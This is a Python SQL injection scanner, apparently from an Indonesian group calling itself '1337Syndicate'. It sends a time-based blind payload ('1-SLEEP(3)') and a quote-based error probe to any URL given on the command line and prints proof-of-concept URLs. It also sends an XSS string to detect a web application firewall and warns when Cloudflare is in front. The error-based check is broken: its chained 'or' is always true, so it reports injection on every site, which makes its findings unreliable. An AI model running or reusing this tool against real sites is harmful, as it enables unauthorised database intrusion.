"""
1337Syndicate
IT Security Development Research
Coded XylaufyyyId
"""
import requests
import sys
import time

def sqli_(url):
    print("\nMemulai Penetration Testing!")
    print("\n1337syndicate-sqli")
    urlt = url.split("=")
    urlt = urlt[0] + '='
    urlb = urlt + '1-SLEEP(3)'

    Waktu = time.time()
    req = requests.get(urlb)
    Wkt = time.time()
    Waktu_ = Wkt - Waktu
    Waktu_ = str(Waktu_)
    Waktu_ = Waktu_.split(".")
    Waktu_ = Waktu_[0]
    if int(Waktu_) >= 3:
        print("Blind SQL Injection Time Based Terdeteksi!")
        print("Payload:",'1-SLEEP(3)')
        print("PoC:",urlb)
    else:
        print("Blind SQL Injection Time Based Tidak Terdeteksi!")


    payload_sqli = "'"
    urlq = urlt + payload_sqli
    reqqq = requests.get(urlq).text
    if 'mysql_fetch_array()' or 'You have an error in your SQL syntax' or 'error in your SQL syntax' \
            or 'mysql_numrows()' or 'Input String was not in a correct format' or 'mysql_fetch' \
            or 'num_rows' or 'Error Executing Database Query' or 'Unclosed quotation mark' \
            or 'Error Occured While Processing Request' or 'Server Error' or 'Microsoft OLE DB Provider for ODBC Drivers Error' \
            or 'Invalid Querystring' or 'VBScript Runtime' or 'Syntax Error' or 'GetArray()' or 'FetchRows()' in reqqq:
        print("\nSQL Injection Error Based Terdeteksi!")
        print("Payload:",payload_sqli)
        print("PoC:",urlq)
    else:
        pass

def waf_(url):
    try:
        kode = requests.get(url)
        if kode.status_code == 200:
            kode = kode.status_code
        else:
            print("Terdeteksi Kesalahan Dengan Kode Status:", kode.status_code)
    except:
        print("Terdeteksi Kesalahan Dengan Permintaan Pertama!")
        exit()
    r = requests.get(url)

    XylaufyyyId = ["Yes","yes","Y","y"]
    try:
        if r.headers["server"] == "cloudflare":
            print("The Server is Behind a CloudFlare Server.")
            xylaufyyaid = input("Keluar y/n: ")
            if xylaufyyaid in XylaufyyyId:
                exit("Berhenti")
    except:
        pass

    xylaufyaaid = "?=<script>alert()</script>"
    xylaufyaid = url + xylaufyaaid
    waffd = requests.get(xylaufyaid)
    if waffd.status_code == 406 or waffd.status_code == 501:
        print("WAF Terdeteksi!")
    if waffd.status_code == 999:
        print("WAF Terdeteksi!")
    if waffd.status_code == 419:
        print("WAF Terdeteksi!")
    if waffd.status_code == 403:
        print("WAF Terdeteksi!")
    else:
        pass


    print("""
    1337Syndicate
    IT Security Development Research
    Coded XylaufyyyId
Target: {}
    """.format(url))
def help():
    print("""
    1337Syndicate
    IT Security Development Research
    Coded XylaufyyyId
    
    python 1337syndicate-sqli.py http://example.id/page.php?id=value
    """)
    exit()

try:
    arvs = sys.argv
    url = arvs[1]
except:
    help()

if 'http' not in url:
    help()
if '?' not in url:
    help()

Waktu = time.time()

sqli_(url)
waf_(url)

Wkt = time.time()
Waktu_ = Wkt - Waktu
Waktu_ = str(Waktu_)
Waktu_ = Waktu_.split(".")
print("\nWaktu Yang Digunakan:",Waktu_[0],"Detik!\n")
